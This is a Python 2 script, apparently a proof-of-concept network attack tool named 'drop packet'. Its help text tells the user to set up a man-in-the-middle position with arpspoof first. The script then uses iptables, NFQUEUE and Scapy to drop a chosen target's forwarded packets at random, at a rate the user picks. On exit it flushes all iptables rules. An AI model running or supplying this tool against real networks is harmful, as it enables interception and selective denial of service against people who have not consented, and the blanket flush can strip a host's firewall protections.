#!/usr/bin/python2

from netfilterqueue import NetfilterQueue
from scapy.all import *
import sys
import os
import random

class bcolors:
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def presentation():
	print "      _                                    _        _   "
	print "     | |                                  | |      | |  "
	print "   __| |_ __ ___  _ __    _ __   __ _  ___| | _____| |_ "
	print "  / _` | '__/ _ \| '_ \  | '_ \ / _` |/ __| |/ / _ \ __|"
	print " | (_| | | | (_) | |_) | | |_) | (_| | (__|   <  __/ |_ "
	print "  \__,_|_|  \___/| .__/  | .__/ \__,_|\___|_|\_\___|\__|"
	print "                 | |     | |                            "
	print "                 |_|     |_|                            "
	print "press -h for help\n"


def helpMenu():
	print bcolors.FAIL + "Need two arguments <ip> <probability*100>" + bcolors.ENDC
	print bcolors.WARNING + "PoC of dropping tool.\nRemember to do men-in-the-middle attack before using this tool (you can use arpspoof)\n" + bcolors.ENDC
	os.system("arpspoof -h")
	exit()

def configurationIpTableSeed():
	# All packets that should be filtered :

	# If you want to use it as a reverse proxy for your machine
	#iptablesr = "iptables -A INPUT -j NFQUEUE --queue-num 1"
	#iptablesr = "iptables -A OUTPUT -j NFQUEUE --queue-num 1"

	# If you want to use it for MITM :
	iptablesr = "iptables -A FORWARD -j NFQUEUE --queue-num 1"

	print("\nAdding iptable rules and set forward table to 1:")
	print(iptablesr)
	print "\n\n"
	os.system(iptablesr)

	# If you want to use it for MITM attacks, set ip_forward=1 :
	#print("Set ipv4 forward settings : ")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


	#set random seed
	random.seed(3)

def randomGenerator():
	x=random.random()
	return x

def print_and_accept(pkt):
	data = pkt.get_payload()
	payload=IP(data)
	x=randomGenerator()
	print "Packet scr: " + str(payload.src) + "		packet dst: " + str(payload.dst) + " ",
	if (payload.src == sys.argv[1] or payload.dst == sys.argv[1] ) and x < (float(sys.argv[2])/100):
		pkt.drop()
		print "[-] drop packet"
	else:
		print "[+] accept packet"
		pkt.accept()


def main():
	presentation()
	if len(sys.argv) != 3:
		helpMenu()
	print "Ip chose: " + str(sys.argv[1]) + " probaility chose: " + str(float(sys.argv[2])/100)

	configurationIpTableSeed()

	nfqueue = NetfilterQueue()
	nfqueue.bind(1, print_and_accept)
	try:
		nfqueue.run()
	except KeyboardInterrupt:
		nfqueue.unbind()
		print("Flushing iptables and setting ip forward to 0.")
		# This flushes everything, you might wanna be careful
		os.system('iptables -F')
		os.system('iptables -X')
		#unccomment for set ip_forward to 0
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


if __name__ == "__main__":
	main()
